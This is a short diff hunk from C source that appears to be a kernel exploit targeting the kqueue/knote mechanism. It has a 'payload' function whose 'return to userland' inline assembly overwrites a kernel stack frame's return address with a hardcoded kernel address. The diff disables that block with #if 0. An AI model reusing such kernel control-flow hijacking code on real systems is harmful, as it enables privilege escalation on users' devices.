@@ -66,12 +66,17 @@ void payload(struct knote *kn)
 	}
 
 	// Return to userland
+	
+	#if 0
+	
 	uint64_t* fAddr = (__builtin_frame_address(2)); // Get kern_close stack frame
 	asm volatile("movq %%rsp, %0" : "=r"(fAddr)); 	//Update stack pointer
 	*(uint64_t*)(((uint64_t)fAddr) + 8) = 0xFFFFFFFF82616B25; //Update return address 
 	asm volatile("movq %rax, 0x0"); // reset return value (just in case)
 	asm volatile("pop %rbp"); 		// pop base pointer off stack
 	asm volatile("ret;");
+	
+	#endif
 }
 
 void *exploitThread(void *arg)
